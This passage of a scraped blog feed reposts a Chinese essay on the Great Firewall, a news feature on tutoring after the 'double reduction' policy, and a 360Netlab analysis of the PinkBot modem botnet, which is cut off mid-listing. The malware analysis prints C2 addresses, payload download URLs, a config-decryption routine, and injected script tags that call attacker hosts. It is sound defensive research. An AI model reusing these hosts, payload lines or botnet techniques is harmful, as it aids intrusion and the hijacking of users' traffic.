金盾工程花大钱搞出来，好评反而不如GFW，十一局的干警们脸上无光无法跟老一辈交代啊。公安系统的技术力量跟GFW没法比，不过公安系统有的是钱，随便买个几十万个摄像头几万台刀片几十PB硬盘接到省市级网络中心，把什么东西都记录下来。问题是记下来不能用，只能靠公安干警一页一页地翻Excel。所以说，虽然看起来GFW千疮百孔，金盾深不可测，只是因为公安部门比起GFW来比较有攻击性，看到毒草不是给你一个RST而是给你一张拘留证。反而是GFW大多数时候都把毒草给挡住了，而大多数毒草金盾都是没发现的。 国家信息安全话语范式 境外网上而来的大量网络宣传让从未有过网络化经验的中央无所适从、毫无办法、十分着急。这些东西对中央来说都是难以忍受的安全威胁，为这些威胁又发生在网上，自然国家网络安全就被提上了首要议程。适逢信息化大潮，电子政务概念兴起，中央下决心好好应对信息化的问题，于是就成立了国家信息化工作领导小 组。我们可以看到，首批组成名单中，安全部门和宣传部门占了大多数席位，而且其第一下属机构就是处理安全问题，第二下属才是处理信息化改革，安全需求之强 烈，可见一斑。正是这个时候，一贯对信息安全充满独到见解的方滨兴被信产部的张春江调入了安管中心练级。方滨兴对信息安全的见解与高层对网络安全的需求不谋而合。 方滨兴在他最近的讲话《五个层面解读国家信息安全保障体系》中说：”一定要有一个信息安全法，有了这个核心法你才能做一系列的工作。”国家信息安全体系的首要核心就是以信息安全为纲的法律保障体系，通过国家意志――法律来定义何谓”信息安全”。信息安全本来是纯技术、完全中性的词语，通过国家意志的定义，将”煽动…煽动…煽动…煽动…捏造…宣扬…侮辱…损害…其他…”定义为所谓的网络攻击、网络垃圾、网络有害信息、网络安全威胁，却在实现层面完全技术性、中立性地看待安全，丝毫不考虑现实政治问题。这样既在技术上实现完备的封装，也给了用户以高可扩展性的安全事件定义界面。对国家安全与技术安全实现充满隐喻的捆绑，对意识形态与信息科学进行牢不可破的焊接，这就是方滨兴带给高层的开拓性思维，这就是方滨兴提出的国家信息安全话语范式。 这个话语范式是如此自然、封装得如此彻底，以至于几乎所有人都没有意识到中国的网络化发展出现了怎样严重的问题。几乎所有网民都没有意识到，给他们带来巨大麻烦和沮丧的GFW竟然是本来应该为网民打黑除恶的国家互联网应急响应中心；几乎所有网民都没有意识到，自己在网上某处的一亩三分地修剪花草对于国家来说竟然是网络安全攻击事件；几乎所有决策者都没有意识到，那个看似立竿见影的防火墙实际上具有怎样强大的副作用、会给互联网发展带来怎样大的伤害；几乎所有决策者都没有意识到，使用GFW这样专业的安全工具来进行网络封锁意味着什么。意识形态面对网络化这样变幻莫测的景色无法忍受，就只能用眼罩封闭住眼睛。 在讨论网络化的中文理论文本中，摆到首要位置占据最多篇幅的便是网络安全和网络威胁。国家信息化工作领导小组第一下属机构便是处理安全问题。这样，在网络本身都没有发展起来的时候，就在理论上对网络进行种种限制和控制；在网络仍然自发地成长起来以后，便在文化上对网络进行系统性妖魔化，在地理上 对网络中国进行闭关锁国。更严重的是，在根本不了解技术本质和副作用的情况下使用国家信息安全工具，就像一个不懂事的小孩把玩枪械。在维护安全的话语之下，决策者根本不知道使用GFW进行网络封锁就是在自己的网络国土上使用军队进行镇压，切断网线就是在自己的网络国土上使用核武器。 更悲哀的是，GFW的建设者们大多都没有意识到他们在做的究竟是什么事情，在签订保密协议之后就无意识中投身党国事业滚滚长江东逝水。像云晓春这种 跟着方滨兴出来打江山的，方滨兴倒是高飞了，云晓春们就只能鞠躬尽瘁干死技术，在安管中心反而被王秀军、黄澄清之辈后来居上。而当初在哈工大跟着方滨兴的穷研究生们，最后也陆陆续续去了百度之类的公司。GFW面临与曼哈顿工程一样的伦理困局。科学本是中立的，但科学家却被政治摆弄。技术工作者们只关心也只被允许关心如何实现安全，并不能关心安全的定义到底如何。他们缺乏学术伦理精神，不能实践”对自己工作的一切可能后果进行检验和评估；一旦发现弊端或危险，应改变甚至中断自己的工作；如果不能独自做出抉择，应暂缓或中止相关研究，及时向社会报警”的准则。结果就算他们辛辛苦苦做研究却也不能造福民生，反而被扣上“扼杀中国人权”，“纳粹帮凶”的帽子，不可谓不是历史的悲哀。 这种话语范式浸透了社会的方方面面。在这种话语之下，中国有了世界上最强大的防火墙，但中国的网络建设却远远落后于世界先进水平；中国有了世界上最庞大的网瘾治疗产业链，但中国的网络产业却只会山寨技；中国有了世界上最多的网民，但在互联网上却听不见中国的声音。GFW已经实现了人们的自我审查，让人们即使重获自由也无法飞翔，完成了其根本目的。现在即使对GFW的DDoS的技术已经成熟，然而推倒墙却也变得没有意义，只能让公安系统的金盾得势，更 多的网民被捕，最终新墙竖起。这一切都出自意识形态化现代性与网络化后现代性之间巨大断裂，以及“国家信息安全话语”这种致命的讳疾忌医。 结语 一部GFW简史同时也是中国网络化简史。网络化既是技术变革，也是文化变革。网络文化这种”有害成份”无法分而治之，因为网络化的技术变革与文化变 革是一体的；后现代的网络文化也无法与现代的意识形态文化进行同化，因为两者分属不同的范式。网络的确是意识形态完全的敌人，因为网络多元化文化要求取消意识形态的中心地位；但意识形态不是网络的敌人，事实上网络没有敌人，因为网络只有解构对象。因此对于执政者来说，意识形态的中心地位与网络化发展趋势两者只能选择其一。实际情况是，执政者选择了前者，而把大刀挥向了Web 2.0。于是网络用它一贯调侃的风格模仿意识形态话语进行了如下讽刺： “我们对你陈旧的政权概念和意识形态烂腌菜毫不感兴趣。你无法理解在人类网络化的历史潮流之前宏大叙事为何而消解，你也无法理解国家和民族概念为何将分崩离析，你无法改变你对互联网的无知。你的政权无法成为我们真正的敌人。” --《2009匿名网民宣言》 其实， 《2009匿名网民宣言》只是过早的预言，赛博朋克式的谜语。 然而，无论中国的互联网受到了怎样的限制和压迫，即便中国网民的眼界已经被成功禁锢，中国的网络还是以它自己的方式适应种种压力顽强地发展。无论有多么强大的GFW或者金盾，即使被关在果壳之中，网络仍然在以意识形态完全不能理解的方式走向后现代蓝海，自成为无限空间之王。 ","link":"https://blog.gd1214b.icu/post/r3oKMxMPu/"},{"title":"羽绒服、茅台与家长委员会","content":" 本文转自：https://mp.weixin.qq.com/s/Ofsg7pTanH3cu9nFEfJsMw 当人们开始用各种方式规避政策时，搞笑段子就成了荒诞现实。 一个公司的边界可能在哪里？最近两个月，这个问题有了新的答案。 “最让我没想到的是，公司居然还要做羽绒服。” 一位熟悉猿辅导业务的人说。 在线教育公司做羽绒服，听上去不过是最终会被放弃的诸多调研方向之一。但国庆期间，猿辅导在 BOSS 直聘挂出的服装设计岗位。负责招聘的人说现在团队已经有 5 个人，准备做时尚的户外羽绒服，面向成人市场。 那位熟悉猿辅导业务的人对《晚点 LatePost》说，现在猿辅导手上就三张牌：去年融到的数十亿美元、数亿学生都知道的猿辅导品牌、在广告大战中积累的流量。接下来就是要想办法怎么把这几张牌变现，“新消费是现在的热点，冬天也快到了。” 9 月底，猿辅导母公司的一家关联公司已经全资控股了北京冰原服饰有限公司。据教育垂直媒体多知网报道，这家公司的法人陈萌沧是猿辅导创始人李勇在网易新闻期间的前同事。 7 月下旬公布的中国教育 “双减” （中小学生减轻校内校外负担）政策，让所有从业者都不得不找新方向，不管这个方向是不是和教育相关。 新规禁止所有教育培训机构在周末和假期为中小学生提供学科培训。中国教育培训市场最有利可图的部分几近消失。周中开学科培训，也需要机构转成非盈利组织。 公立学校也要确保小学一、二年级不布置家庭书面作业，更高年级也得限制作业时间，全面减轻校内负担。 “鸡娃” 这个词已经诞生十多年，随着就业压力前移为升学压力，学生和家长的焦虑程度日渐递增，2020 年的教育投资潮后，更多大公司成长起来，拉拢更多学生家长买课以换取增长。根据《晚点 LatePost》统计，去年投向中小学学科教培市场的风险资金就超过 500 亿元。 中小学减负政策以前所未有的力度落地，切断了这个市场与资本的联系，覆盖了中国近 2 亿中小学生 12 年求学历程。政策对下一代人的影响将在几十年里逐渐展开。 在此之前，账上还有几十亿元的公司不会说关就关，总得找办法活下去。家长的焦虑也不会就此消失，而是以更加隐蔽的方式呈现。 羽绒服 9 月开始，猿辅导、作业帮、好未来、新东方等各家教培巨头都暂停了招生，并裁撤了数万名辅导老师、销售等。新东方、好未来更是开始关闭各个城市的中小学学科教学点，当周末和假期都不能再上课后，这些教学点难以承担昂贵的房租和师资。 一位作业帮中层看着自己原本一百多人的团队少了一半，又少了一半，到中秋节前，只剩寥寥十几个人。当他正准备和这十几个人继续支持公司新方向的时候，他也收到了裁员通知。离开的时候，他和老板说，“如果公司需要，我随时都可以回来。” 但另一些人突然发现自己更被重视了。一位作业帮战略人士说，现在 “感觉自己特别重要”，当竞争最激烈的时候，战略的工作更多是关注竞争对手在做什么，自己公司是不是该跟进。但当各家都不得不在一片黑暗中摸索的时候，战略就成了提着灯在前面探路的人。 他梳理了所有教育公司可能做的产品，最后选择了教育硬件。他语气神秘，相较字节跳动、腾讯做的学习台灯，和新东方做的学习机，他们想做的是 “不一样的东西，这样才有赢的可能。” 除了羽绒服外，猿辅导也在尝试做电子教材内容，将教材的知识点做成一个个动画短片，卖给消费者或者卖给学校。他们还研究过玩具、母婴用品，近视眼镜等方向。 一位熟悉字节业务的投资人听说，字节围绕动画、玩具做了诸多调研，因为公司在尝试塑造动画 IP，考虑生产玩具。但他对这个方向表示怀疑，“以前孩子反复看电视才记住那些动画形象。现在抖音上那么多选择，孩子凭啥就记住你的动画形象？” 另一位在一线教育机构工作的人士最近在研究老年人市场，发现除了广场舞教学课程，最火的就是教老年女性如何得体穿旗袍的礼仪课。他自己也觉得 “跨度不小”，公司根本没怎么接触过老年市场。 “我们也知道，大的战争已经结束了，小的战役很难扭转战局。” 说完这句，他低下头叹了口气。短暂沉默后，他说，可大家就是不甘心，即使从头再来，今天的起点也已经远远好于十几年前公司刚创办的时候。 不是所有公司都还有从头再来的机会，相较于资金相对充足的大公司，中小创业公司在过去两个月直面死亡。 一位北京的教育创业者在 9 月退租了上课的教室，因为一半以上的学生已经申请退费，他将剩下的学生拉去自己 160 平米的家中上课，每次上下课有人开车接送。他主要精力已经转向新开的餐馆，并准备把退费学生的课程折算成餐饮充值卡，返还给家长。 投资人们基本已经放弃了向中小教育公司要回投资款，为了避免被牵连。过去两个月，他们忙着帮这些公司嫁接资源：例如把青少年的学科课程换成另一家被投企业的成人知识付费课程，或者把编程课程换成另一个投资项目的轮胎打折券、加油优惠卡，给家长弥补点损失。 一些家长不愿把手里上万甚至几十万的课程折算成这些东西。投资机构找来了第三方投后公司，培训教育公司创始人们如何化解家长上门闹事的危机，金木衣（化名）过去一个月就做了多场培训。 要避免家长要求退费，大闹办公楼的场景出现，需要诸多实操技巧。例如家长一般会在地铁站或者广场集结，公司需要在这些地方安插眼线报信，一旦人群走进办公楼，就安排扫健康码，散开人群。 在此之前，金木衣服务的是殡葬公司、KTV、夜总会，积累了应付危机的经验。当群情激愤的时候，CEO 一定不能露面，因为会让人们更激动。要将情绪激动的家长引导进不同会议室，并且关掉会议室里的摄像头，避免出现肢体冲突说不清楚。 教育行业的景象启发了金木衣，他开始拓展更多行业，以分散风险。 想要降低风险的，还有政策高压下依然给学生进行学科培训的 “游击队”。 茅台 那是个过于拥挤的房间：不到 60 平米的两居室里，堆满了严立学（化名）和女友两个人所有的生活用品，数万元现金，和超过 30 箱白酒，其中超过一半是茅台，另一半则是五粮液和西凤酒——如果把这些箱子层层堆起来，得有三层楼高，换成现金也能在严立学的老家，一个三线城市买下一座独栋小院。 不是白酒经销商，也不是官员，严立学是一位 “上私课” 的课外辅导老师，曾在多家在线教育机构任职。用现金和茅台酒来收学费，是严立学从一位学生家长那里学来的。 “抓那些微信收款的老师可能只需要五分钟。” 然后呢？“然后，怎么判定白酒的价值，是不是算违法所得，就有操作空间了。” 严立学表情透着得意。 在中国焦虑的家长和竞争激烈的学生群体中，“上私课” 从来就不是什么新鲜事。但在 “双减” 落地后，“上私课” 的地点从隐蔽处转向更隐蔽处，上课方式从搞笑的段子变成了荒诞现实。 见到严立学的时候，他梳着三七分的油头，穿着蓝色的衬衫，扣子扣到了最上面一个，配上黑色皮带和灰色手提皮包，就像中层干部或者教导主任。但实际上他只有 28 岁，平时爱穿印有卡通头像的 T 恤、收藏动漫手办。 见面的那天是周末，严禁机构为中小学生提供学科培训，也是严立学每周最忙碌的时候。上午，他在一所大学的篮球场上课，一位任教的家长提供了场地。他一边拿着篮球，时不时投投篮，一边给四位拿着平板电脑的学生讲物理课。他将这些学生家长所在的群命名为 “体育理论知识提升”，课上讲的内容是 “篮球的受力分析。” 结束了这节 “体育理论” 课，他又匆忙赶到一家事业单位的办公楼，给三个孩子上物理课。当陌生人尝试单独进入这栋办公楼时，保安会要求登记姓名身份证号，打电话让内部联系人来接。 正是因为足够安全，严立学才敢 “顶风作案”。他曾在核心区域的居民楼内，走过三道 “防线”，进入学生家中。家长们在小区大门、单元楼大院门口和单元楼下各设了一道 “岗哨”，一旦看到一队陌生走来，就以扫健康码、身份登记等诸多程序拖延时间，单元楼南北各有一个出口供老师 “撤离”。家长笃定地告诉严立学，“老师你就放心上课，一旦有情况，绝对能让你先跑掉。” 上完了下午的课程，严立学又匆匆走进办公楼附近的酒店，还有上百位网课学生等着他上课。 主流的线上教室提供商均封禁了周末给中小学生进行学科培训的教室。严立学每节课都在不同的软件上课，直播教室的名称改成 “xx 公司会议”，他甚至还考虑等到风声更紧的时候，让所有学生的电脑上都装上软件，直接在国外最大的视频网站 YouTube 上直播开课。 招徕这些学生的方式就像进行某项军事任务。在一张招生 PPT 上，满是高中各个学科的课程，每个课程后面都跟着一串串代码，HAA、JBA、HBD。 “不懂代码含义的，压根不是我们的目标客户。” 严立学说，第一个字母代表真实年级，按照 26 个字母顺序，H 代表的就是初中八年级，第二个代表学习进度，第三个代表学习难度。 对严立学来说，“双减” 给他带来的最大的影响是，新报名的学生实在太多，有点接不过来了。所以通过这种代码 “公开 ” 招来的学生已经没有多少。家长们之间相互介绍已经能给他提供足够多的生源。他周末两天最多能上课 20 小时，两天赚两万，年收入上百万。 相较于我接触的其他几位 “上私课” 的老师，严立学赚的最多、考虑的也最多。当别的老师还在咖啡馆、自己家中给学生上课，用微信收学费时，严立学已经往返于办公楼、体育场和有人“放哨”的住宅楼，学费只收现金和名酒，甚至把银行卡上的十几万全部换成了茅台，就为了不在网上留下任何痕迹。 他还咨询了两三位律师，得知个人老师被举报查处，最严厉的处罚可能是上征信黑名单和被短期拘留，“如果严打，我的竞争对手会少很多很多。” 家长委员会 校外培训机构在大收缩，但不少家长提高孩子成绩的需求没有消失，一部分人甚至因此背上了更重的压力。 夏君山（化名）的孩子在西南省份的一所公立小学上二年级，“双减” 之前每天放了学能撒欢两小时。政策禁止一二年级布置书面家庭作业，并且不允许一二年级有纸面考试之后，她玩的时间只剩下半小时。 孩子回家额外写一小时作业，他再花半小时检查，就到了晚上 8 点半。之后再读读英语，练练琴，孩子就得洗洗睡觉。之前他和妻子不需要检查作业，孩子都是在学校写完作业回来，现在必须有个人盯着。 额外增加的作业来自一个分工明确的组织——家长委员会。班级家长群定期选出委员会的会长和十几个业务骨干，会长负责和各科老师单线沟通，确定本班学生每天需要额外完成的习题。习题由家长自行批改，练习册由家委会统一购买、不强制，不另外收费。 家长委员会用 “公司制管理”，避免一切不必要的麻烦。给孩子们买额外作业的费用来自每人一年 300 元的班费，家委会中专门有人负责财务、出纳、审计，每个月公开一次审计后的账单。 夏君山跟我抱怨，之所以做的如此规范，是因为现在家长们举报的渠道实在太通畅——去年中秋节，学校组织学生们举办庆祝活动，让每个学生从家里带一道菜。活动还没开始就被家长举报了，名头是可能存在食品安全问题。 家委会和老师之间已经达成了默契。家委会明面上和老师没有任何交集，老师不在家委会微信群中，也不会在班级内公开提到额外的练习册。但老师每天都会和会长沟通，指导家委会的作业进度，也会一对一把成绩排名发给家长，尽管政策明令禁止义务教育阶段对学生进行排名。 老师们也需要家委会这种 “民间力量” 盯住学生，他们的工作时间往往已经被备课、上课占满。以往孩子三点半放学他们就能够下班，现在还需要多加两小时的 “课后服务” 时间。一位在珠海公立学校工作的小学老师告诉我，课后服务的报酬是一小时 50 元，内容就是摆张桌子在教室外等着学生来问问题，“这其实是种变相的课后辅导，但没办法，学生最后考得不好老师考评也会受影响。” 只有孩子们搞不清楚状况。夏君山七岁的女儿有时候会写着写着额外的作业，抬起头来问他，为什么只有我们班有作业，别的班没有？夏君山就摆出不容置疑的严肃脸，“学校不让布置，这是老师偷偷布置的。你可以不写，但是被老师骂的就是你了啊。” 在夏君山看来，老师愿意在多大程度上关照孩子，取决于家长和老师之间的关系。这位中年父亲在一家大公司做技术实施，跟我聊天一小时中间就三次被客户来电打断。挂掉客户的电话后，他说，“平时怎么和客户搞关系，就怎么和老师搞关系。” 不能送得太刻意，一般是给自己家孩子买东西的时候，也给老师家孩子买一份；也不能送得太贵，老师出于礼貌，也会回礼，大约是 “我送你几百块的化妆品，你回我一个书包” 的程度。 根据国家中长期教育改革和发展规划纲要（2010-2020 年），原则上 50% 的应届初中生毕业后要读中等职业学校。 “家长怎么能接受孩子比自己过得差呢？” 夏君山说，中考就是第一个大坎，所以从小学就要开始 “鸡娃”，如果真的按照政策规定，限制孩子写作业和考试，一直放松到初中再努力，“那跟开盲盒有什么区别？” ","link":"https://blog.gd1214b.icu/post/b6xG1VQQo/"},{"title":"一个藏在我们身边的巨型僵尸网络——PinkBot","content":" 本文转自：https://blog.netlab.360.com/pinkbot/ 本文完成于2020年春节前后，为维护广大最终消费者的利益，一直处于保密期无法发表。近日 CNCERT 公开披露了相关事件，令本文有了公开契机。在保密期的这段时间里，Pink 也出现一些新的小变动，笔者筛选了其中一部分放到“新动向”章节，供其他同仁共同追踪研究。 概述 2019年11月21日，安全社区的信任伙伴给我们提供了一个全新的僵尸网络样本，相关样本中包含大量以 pink 为首的函数名，所以我们称之为 PinkBot。 Pinkbot 是我们六年以来观测到最大的僵尸网络，其攻击目标主要是 mips 光猫设备，在360Netlab的独立测量中，总感染量超过160万，其中 96% 位于中国。 PinkBot 具有很强的技术能力： PinkBot 架构设计具备很好的健壮性，它能够通过多种方式（通过第三方服务分发配置信息/通过 P2P 方式分发配置信息/通过 CNC 分发配置信息）自发寻址控制端，并对控制端通信有完备的校验，确保僵尸节点不会因某一个环节的阻杀而丢失或被接管；甚至对光猫固件做了多处改动后，还能确保光猫能够正常使用； PinkBot对部分域名的解析查询采取了 DNS-Over-HTTPS 的方式，这个也是在传统BotNet中不太常见的一种手段； 在与相关厂商的屡次攻防博弈中，PinkBot 的运营者都占据了明显的对抗优势。 可以说，PinkBot 在整个过程中表现出了极强的针对性和专业性，各方面能力都很均衡，甚至有些可怕。 规模及影响范围 我们通过对多个数据源的交叉对比，推测 PinkBot 的感染量在百万量级。三个评估的数据源如下： 2019-11-30我们从可信任的安全伙伴手里拿到一个统计数字，日活去重 1,962,308 个IP; 2020-01-02从CNCERT拿到的统计结果： “该僵尸网络的规模目前无法准确测算。根据NetFlow数据、主动探测数据、实时监测数据等多个维度的数据测算，该僵尸网络关联的Bot节点IP地址数量超过500万。因家庭宽带IP是动态分配的，背后的真实感染设备规模无法精确估计，推测实际感染设备数量在百万级，测算的一个主要依据为曾监测到1分钟内连接C2的IP数量超过百万。” 根据我们 (360NetLab) 在全网范围内持续探测的数据评估，2020-01-08 当天活跃的受感染 IP 数量为 165 万。 在我们全网探测的测量数据中，受感染的 IP 主要集中在中国 (96%)，遍及全国 33 个省。 PinkBot 技术架构 PinkBot是一个同时融合了“P2P”和“CNC”的混合结构僵尸网络。一般情况下，它将时效性要求不高的指令（如管理配置信息）通过P2P的方式传递，将时效性要求较高的指令通过CNC模式集中分发（例如：发起ddos攻击，向用户访问的HTTP网站中插广告）。 配置信息 对于每一个Bot来说，最重要的一步是找到自己的管理员。而管理员的信息就包含在“配置”之中，下面是最新截获的配置信息： { &quot;verify&quot;: &quot;1585065675&quot;, &quot;cncip1&quot;: &quot;144.202.109.110&quot;, &quot;cncport1&quot;: &quot;32876&quot;, &quot;dlc&quot;: &quot;5b62596bc1453d51cc7241086464f294&quot;, &quot;dl&quot;: &quot;http【:】//155.138.140.245/dlist.txt&quot;, &quot;dlc1&quot;: &quot;484417e6f65c8e18e684d60c03c4680a&quot;, &quot;dl1&quot;: &quot;https【:】//*****.com/johncase/zip/raw/master/dlist.txt&quot;, &quot;sd0&quot;: &quot;1.1.1.1&quot;, &quot;sdp0&quot;: &quot;443&quot;, &quot;srvk&quot;: &quot;FJAz37XiKgnTLtVpmhjxZcavTJUU5r4XN3Wl5nhTpg0=&quot;, &quot;pxy&quot;: &quot;1&quot; } 其中 verify 字段为指令发布的时间戳，Bot会根据这个时间戳筛选出最新的有效指令。 随后的 cncip 和 cncport 字段指明了僵尸网络的最新CNC地址，攻击者会根据自身需求随时切换这个控制地址。 再随后的“dlc/dl”和 “dlc1/dl1” 字段组为最新的Bot更新地址，其中dlc和dlc1为对应内容的Hash校验字段，算法伪代码为：MD5(MD5(dlist_content)+SHA256(dlist_content))。 “sd0/sdp0”字段为安全DNS地址，对于每一个Bot来说，当需要查询DNS解析记录时，将通过这里指定的DNS服务来查询。且方式为DNS-Over-HTTPS。 rvk字段为服务端的公钥内容（base64编码）。对于每一个bot来说，它和CNC的通讯都是加密的。所以实际通讯前要先经过ECDH的密钥协商得到一个唯一的私钥。在这里指定了CNC端的公钥后，还可以顺带完成了Bot对CNC身份的验签。这是对原有 ECDH 的扩展使用。 pxy字段，推测是一个代理上线的选项。目前没有看到使用迹象，不清楚具体的工作逻辑。 配置信息的保护 通过上一节的介绍，不难发现“配置信息”其实就是这个僵尸网络的核心，它保证了攻击者对僵尸网络的绝对控制能力。 为了防止其他人发现配置信息，传递的配置信息都是异或加密过的密文。异或加解密算法是对称的，其解密代码逻辑如下： def easydecrpyt(message): res = &quot;&quot; for cursor in range(0, len(message)): mbt = ord(message[cursor]) res += (chr((mbt ^ (cursor%0xff) ^ 0xae ^ 0xac ^ 0xbe ^ 0xef) &amp; 0xff)) return res 信息加密后，为了防止他人伪造。攻击者还使用了ecdsa对配置信息进行了签名，签名细节如下： 签名校验使用的密码库为 mbedtls； 签名算法为 ECDSA； 签名时使用的曲线为：MBEDTLS_ECP_DP_SECP192R1； 验签所用公钥为： 04 8D 54 71 71 44 A0 61 DA 5A B4 EA 40 55 2F 21 B1 9B 6C A5 17 92 0F 10 B5 11 56 ED 14 DB 54 47 1A 94 48 06 06 3C 7A B4 3B 25 D1 AC 9F 85 AF 33 9E 配置信息的分发 除了保证配置信息的机密性和完整性外，攻击者还使用了多种手段来分发配置信息，以确保其可用性。 通过第三方服务分发配置信息 通过 BTC+GITHUB 分发配置信息 该分发渠道的核心是一个隐藏在GITHUB上的项目，比如最近一次看到的项目就是（mypolo111/vfg），可以看到这个项目的README中，有两行内容。 其中，模式为P!!&lt;base64&gt;I!!行是配置签名，模式为N!!&lt;base64&gt;K!!行是配置信息的密文。 但对于每一个Bot来说，想要找到这个隐藏项目却很复杂。最初，先从一个固定的BTC钱包1GQNam6xhzYVLWWXvRfu3EjsFon6n6GxMF的转账记录生成一个 topic 标签，在逆向样本相关代码之后，我还原了这个过程，如下图所示（BTC钱包的查询用到了四个web服务，具体的地址也如图中所示）： 对于每一个可能的topic标签，都有很多相关的github项目。遍历这些项目的ISSUES，寻找一个格式为 ...!&lt;base64&gt;...? 的字串，比如我们最近找到的一个就是 ...!L215cG9sbzExMS92Zmc=...? 将这个base64 还原，就是隐藏项目的地址了 mypolo111/vfg 再通过搜索 GITHUB 的 Topics 和 ISSUES，找到那个隐藏的GIT项目。 另：mypolo111 这个账号在多个项目中提交过ISSUES，相关截图如下所示： PS：在这一套寻址逻辑下，攻击者可以通过为 “特定BTC钱包” 增加交易记录的方式，来切换最终找到的 GITHUB 项目。在这样的前提下须封掉指定BTC钱包才能破坏这个僵尸网络以 GITHUB 为主的分发逻辑。 通过 某中文社区 分发配置信息 攻击者在少部分样本中还尝试利用“某中文社区”分发配置信息，这一部分的逻辑和利用GITHUB分发的逻辑相似。 通过 P2P 方式分发配置信息 P2P-Over-UDP123 分发配置信息 Bot节点运行后，会在本地监听 UDP-123 端口，该端口原本是NTP服务默认端口，所用的协议也具有一定的迷惑性。一段时间后，会向公网的四个B段地址（&quot;114.25.0.0/16&quot;，&quot;36.227.0.0/16&quot;，&quot;59.115.0.0/16&quot;，&quot;1.224.0.0/16&quot;）发起 Peer 探测请求，内容为 1C 00 00 00 当目标为正常的 NTP 服务器时会得到 NTP 时间，而如果目标为一个Bot节点时，则有两种回复： 当目标Bot未取得主控信息时回复 1D 00 00 00； 当目标Bot拿到主控信息时，会将主控信息的签名和相应密文回复，发送前，会在信息头补充 0xE3 字节。 下图是最近捕获到的UDP-123 传递的配置信息。 通过 P2P-Over-TCP 分发配置信息 Bot 节点运行后，还会在本地监听一个 TCP 端口，且端口号是通过其公网 IP 计算后得到的，代码如下图所示： 交互协议的格式同UDP123上的相同。 通过 CNC 分发配置信息 攻击者在部分样本中内置了一个域名 cnc.pinklander.com ，当该域名启用后，会展示一个web页面，页面内容和GITHUB项目的内容相同。也是base64 编码后的配置信息。 PinkBot 指令 指令格式 每条指令至少包含7字节，含义依此如下： Token字段，长度4字节，该字段值由服务器端指定，指定后将一直使用这个值。设置方式为：Bot启动后首先会向CC发送新生成的ECDH的公钥，此刻Token为0，当服务端接受后，会分配一个Token值给Bot，这就算指定成功了。 指令字段，长度1字节。CC发出指令后，Bot也要用相同的指令码把执行结果返回。 内容长度字段，长度2字节。当指令不包含具体内容时，设置为零，否则这里填充内容的字节长度数，并追加密文内容。 指令内容。当指令包含内容时，此处填写密文的指令内容。解密方法请继续向下阅读。 这里附上一张截图供参阅，其中红框标记的就是指令字段： 指令传输方式 通讯加密 上述配置信息中的 cncip1 和 cncport1 便是攻击者实际使用的主控节点。PinkBot 连接到 cnc 后将通过密钥交换方式来做加密通信，细节如下： 使用的密码学库为：mbedtls; 密钥交换阶段使用的交换算法 ecdh，加载曲线为 MBEDTLS_ECP_DP_CURVE25519; 务端ECDH公钥前期为硬编码在样本中，跟踪后期，则改为在配置信息中指定。但内容没有变化过：14 90 33 DF B5 E2 2A 09 D3 2E D5 69 9A 18 F1 65 C6 AF 4C 95 14 E6 BE 17 37 75 A5 E6 78 53 A6 0D 报文加密/解密阶段使用的算法为 aes, key 为密钥交换后的secret，加载参数为 MBEDTLS_AES_ENCRYPT 和MBEDTLS_AES_DECRYPT; 在ECDH的标准中，一般双方的公私钥是每次都要重新生成。但在 PinkBot 中，却只要求了 Bot 侧每次不同，而服务端则指定一对固定的公私钥。这种内置服务端公钥的方式，就等于让 Bot 有能力对 CNC 进行身份验证，从而杜绝了通讯过程被中间人攻击的可能性。 指令内容编码 为了能够同时适配 mipsb/mipsl 机型中字节序列的分布不同，传输的内容其实是经过开源库nanopb 转化后的内容，这个库可以通过约定模版的方式来抽象序列化和反序列化的过程，从而忽略掉大/小端内存的干扰。 PinkBot 指令具有丰富的控制能力： 文件下载 系统命令执行 DDoS攻击（HTTP攻击和 UDP 攻击） 扫描功能（扫描的具体内容可以通过指令设置） 汇报设备信息（CPU/系统类型/内存信息/系统版本/硬件信息） 自身更新（将新版本保存到 /tmp/client 后运行） P2P节点列表同步（直接推送一组P2P节点到Bot） http报文注入广告（在受害设备上，嗅探交互报文，遇到http网页时，插入广告js脚本） 启动sock5代理服务（在Bot端架设 Socks5 代理服务，账号密码通过指令设置） 下载文件并执行 停止攻击 重置watchdog PinkBot 持久化方式 与我们常见到的 botnet 不同，PinkBot 为了保持对感染设备的绝对控制权，会在感染光猫后，重新刷写原有的光猫固件。在刷写后的固件中，包含了 PinkBot 的下载器母体和配套的启动程序。 下图是被感染后新增/修改的文件列表： 其中tmp目录的内容可以暂时忽略，这是样本运行中生成的临时文件。 关键文件说明： bin/protect：(md5:9ec5bd857b998e60663e88a70480b828) protect 文件是被刷写固件中的Bot母本。文件中未发现收益类功能，换句话说它更像是一个下载器，在这个样本中可以看到以上5种获取配置信息的代码。它最主要的功能，就是启动后会从配置信息中拿到最新的样本并把它们运行起来。 /bin/tr69c: (md5:451a3cf94191c64b5cd1be1a80be7799) tc69c 文件是光猫原始固件中 tr69c 的一个patch版本。通过对比分析，发现该patch主要移除了光猫的更新功能。也就是说，被刷写的光猫，将无法通过 tr69c 进行固件升级。这应该是攻防对抗中引入的持久化操作。 跟踪及处置 规模评估 前面提到，Pink 具有通过 p2p 方式来分发非实时性指令信息的特性。利用这个特性，我们得以在全网范围内对 PinkBot 的感染量进行评估，最终得出的全球受感染IP超过160万的这个结论。 指令跟踪 我们通过模拟 PinkBot 来实时接收CNC主控分发的指令。 除了日常的维护类指令（心跳指令/peerlist同步指令）外，我们还收到了多条向WEB网页插入广告的指令，例如： &lt;script async src=&quot;http【:】//45.32.21.251/j/?$$&quot;&gt;&lt;/script&gt; &lt;script async src=&quot;http【:】//167.179.80.159/j/?$$&quot;&gt;&lt;/script&gt; &lt;script async src=“http【:】//114.55.124.13/j/?$$“&gt;&lt;/script&gt; 汇报及处置 通报各级监管机构； 依法配合执法机构行动； 联合设备供应商进行安全防御； 联合若干互联网基础设施供应商共同监控PinkBot行动。 新动向 本文其他部分，均完成于2020年春节前后，到现在已经度过了一年半的时光。在这段时间中，我们没有发现 Pink 出现太大的变动，本节附上了一些最新的线索，供同仁们共同研究和追踪。 最新传播的配置信息 随着对 pink 的持续追踪，我们发现，pink 的配置信息会间歇性发生变化，变动内容主要体现在 CNC 字段和 DL* 字段，并于最近几个月趋于稳定。下面是我们在 2021/10/5(北京时间) 捕获的最新配置信息。 { &quot;verify&quot;:&quot;1611936001&quot;, &quot;cncip1&quot;:&quot;140.82.40.29&quot;, &quot;cncport1&quot;:&quot;26007&quot;, &quot;dlc&quot;:&quot;450aa79da035a8a55ca4c0e6b1025b50&quot;, &quot;dl&quot;:&quot;http://209.250.247.60/dlist.txt&quot;, 